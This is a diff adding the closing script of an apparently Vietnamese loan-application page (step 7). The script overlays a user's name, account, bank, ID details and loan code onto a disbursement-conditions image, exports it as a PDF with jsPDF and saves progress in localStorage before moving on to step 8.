+        const safeFullName = sanitizeValue(userData.fullName);
+        const safeLoanCode = sanitizeValue(userData.loanCode);
+        const safeBankName = normalizeBankName(userData.bankName);
+        const safeIdIssuePlace = sanitizeValue(userData.idIssuePlace);
+        const safeIdIssueDate = sanitizeValue(userData.idIssueDate);
+        
+        return [
+          {
+            value: sanitizeValue(userData.accountNumber),
+            x: 423,
+            y: 322,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeFullName,
+            x: 429,
+            y: 354,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeBankName,
+            x: 423,
+            y: 390,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeFullName,
+            x: 429,
+            y: 444,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: sanitizeValue(userData.cccd),
+            x: 423,
+            y: 487,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeIdIssueDate,
+            x: 707,
+            y: 487,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeIdIssuePlace,
+            x: 952,
+            y: 487,
+            font: "600 23px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeLoanCode,
+            x: 211,
+            y: 60,
+            font: "600 27px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+          {
+            value: safeLoanCode,
+            x: 211,
+            y: 97,
+            font: "600 27px 'Be Vietnam Pro', Arial",
+            color: "#000000",
+          },
+        ];
+      }
+      
+      // =====================================================================
+      // CANVAS RENDERING (LEGACY - kept for backward compatibility)
+      // =====================================================================
+      
+      /**
+       * Render hình ảnh điều kiện giải ngân vào canvas (legacy)
+       * @deprecated Sử dụng renderImageOverlay() thay thế
+       */
+      function renderDisbursementCanvas() {
+        // Gọi hàm mới để render image overlay
+        renderImageOverlay();
+      }
+      
+      // =====================================================================
+      // PDF DOWNLOAD
+      // =====================================================================
+      
+      /**
+       * Tải xuống canvas dưới dạng PDF
+       */
+      function downloadDisbursementAsPDF() {
+        const canvas = document.getElementById("disbursementCanvas");
+        const btn = $("#downloadDisbursementBtn");
+        
+        if (!canvas || !canvas.width || !canvas.height) {
+          showError("Điều kiện giải ngân chưa sẵn sàng để tải xuống. Vui lòng thử lại.");
+          return;
+        }
+        
+        try {
+          // Hiển thị loading trên nút
+          const originalText = btn.html();
+          btn.prop("disabled", true);
+          btn.html('<span class="spinner-small"></span>ĐANG TẢI...');
+          
+          // Kiểm tra jsPDF library
+          if (!window.jspdf || typeof window.jspdf.jsPDF !== "function") {
+            throw new Error("Thư viện jsPDF chưa được tải");
+          }
+          
+          const { jsPDF } = window.jspdf;
+          
+          // Tạo PDF
+          const pdf = new jsPDF({
+            orientation: "p",
+            unit: "px",
+            format: [canvas.width, canvas.height]
+          });
+          
+          // Thêm canvas vào PDF
+          pdf.addImage(
+            canvas.toDataURL("image/png", 1.0),
+            "PNG",
+            0,
+            0,
+            canvas.width,
+            canvas.height
+          );
+          
+          // Tạo tên file
+          const loanCode = (userData.loanCode || "SHBVN000000").replace(/[^a-zA-Z0-9_-]/g, "");
+          const fileName = `DieuKienGiaiNgan_${loanCode}.pdf`;
+          
+          // Lưu PDF
+          pdf.save(fileName);
+          
+          // Cập nhật userData
+          userData.isDisbursementDownloaded = true;
+          userData.disbursementDownloadedAt = new Date().toISOString();
+          
+          // Lưu vào localStorage
+          if (saveUserData()) {
+            showSuccess("Điều kiện giải ngân đã được tải xuống thành công!");
+            enableProceedButton();
+          }
+          
+          // Khôi phục nút
+          btn.prop("disabled", false);
+          btn.html(originalText);
+          
+        } catch (error) {
+          console.error("Lỗi tải PDF:", error);
+          showError("Không thể tải điều kiện giải ngân. Lỗi: " + error.message);
+          
+          // Khôi phục nút
+          btn.prop("disabled", false);
+          btn.html("TẢI XUỐNG");
+        }
+      }
+      
+      // =====================================================================
+      // NAVIGATION
+      // =====================================================================
+      
+      /**
+       * Kiểm tra và chuyển sang step 8
+       */
+      function proceedToStep8() {
+        // Cập nhật currentStep
+        userData.currentStep = 8;
+        userData.lastStep7CompletedAt = new Date().toISOString();
+        
+        // Lưu và chuyển trang
+        if (saveUserData()) {
+          window.location.href = "step8.html";
+        }
+      }
+      
+      // =====================================================================
+      // INITIALIZATION
+      // =====================================================================
+      
+      $(document).ready(function() {
+        // Disable buttons ban đầu
+        disableButtons();
+        
+        // Load userData (sẽ tự động tạo mock data nếu cần)
+        loadUserData();
+        
+        // Render canvas
+        renderDisbursementCanvas();
+        
+        // Event handlers
+        $("#downloadDisbursementBtn").on("click", function() {
+          if (!$(this).prop("disabled")) {
+            downloadDisbursementAsPDF();
+          }
+        });
+        
+        $("#proceedToFinalStepBtn").on("click", function() {
+          if (!$(this).prop("disabled")) {
+            proceedToStep8();
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
+
+
